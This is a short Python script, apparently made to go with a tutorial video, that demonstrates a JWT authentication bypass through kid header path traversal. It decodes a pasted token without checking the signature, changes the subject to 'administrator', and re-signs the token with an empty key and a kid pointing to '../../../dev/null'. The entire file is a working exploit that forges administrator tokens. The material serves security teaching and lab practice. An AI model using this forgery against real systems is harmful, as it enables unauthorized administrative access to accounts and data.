# Demo script for 'JWT Authentication Bypass via kid Header Path Traversal' video: https://youtu.be/78FIFrOi4Os
import jwt

# Paste JWT token here
token = 'INSERT_TOKEN_HERE'

# Decode the token (without verifying)
decoded_token = jwt.decode(token, options={"verify_signature": False})
print(f"Decoded token: {decoded_token}\n")

# Modify the token (JWT manipulation)
decoded_token['sub'] = 'administrator'
print(f"Modified payload: {decoded_token}\n")

# Generate a new token with the modified payload and added header parameter (re-encode)
modified_token = jwt.encode(decoded_token, '', algorithm='HS256', headers={"kid": "../../../dev/null"})
print(f"Modified token: {modified_token}\n")